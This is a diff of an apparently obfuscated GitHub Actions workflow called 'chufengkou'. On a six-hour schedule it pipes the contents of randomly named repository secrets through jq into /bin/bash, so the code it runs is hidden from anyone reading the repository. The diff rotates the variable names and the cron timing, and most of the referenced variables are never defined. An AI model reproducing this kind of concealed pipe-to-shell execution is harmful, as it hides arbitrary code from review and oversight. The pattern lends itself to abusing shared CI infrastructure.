@@ -1,9 +1,8 @@
 name: chufengkou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
+    - cron: '4 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,25 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: chufengkou
         env:
-          wssi0: ${{ secrets.wssi0 }}
+          tlvwi43226: ${{ secrets.tlvwi43226 }}
         run: |
-          echo $wssi0 | jq -r .hwto5 | /bin/bash
-          echo $tgg7893 | jq -r .y31938 | /bin/bash
-          echo $y701 | jq -r .ekj74602 | /bin/bash
-          echo $ldvfo05480 | jq -r .tva40990 | /bin/bash
-          echo $cyk16868 | jq -r .vdw91 | /bin/bash
-          echo $g55182 | jq -r .dp21 | /bin/bash
-          echo $os3683 | jq -r .zst760 | /bin/bash
-          echo $sbf489 | jq -r .u46613 | /bin/bash
-          echo $koytd6682 | jq -r .n5 | /bin/bash
-          echo $f2500 | jq -r .ii66 | /bin/bash
-          echo $vzayx5633 | jq -r .c3704 | /bin/bash
-          echo $ie17008 | jq -r .w113 | /bin/bash
-          echo $kijcj4 | jq -r .qv3297 | /bin/bash
-          echo $hbey309 | jq -r .zgl780 | /bin/bash
-          echo $rsuua76978 | jq -r .od2 | /bin/bash
-          echo $nqve0 | jq -r .r6 | /bin/bash
-          echo $vjfa3004 | jq -r .ra4 | /bin/bash
-          echo $mejn31 | jq -r .cjtfm50712 | /bin/bash
-          echo $s748 | jq -r .vpubm922 | /bin/bash
+          echo $tlvwi43226 | jq -r .eus56 | /bin/bash
+          echo $pjea5 | jq -r .bdnuk99179 | /bin/bash
+          echo $eyoq22853 | jq -r .htw0 | /bin/bash
+          echo $opfwg58 | jq -r .vo68689 | /bin/bash
+          echo $oehxd09 | jq -r .sarz96394 | /bin/bash
+          echo $zg8 | jq -r .tp66099 | /bin/bash
+          echo $qu927 | jq -r .p60355 | /bin/bash
+          echo $wd88 | jq -r .f7250 | /bin/bash
 
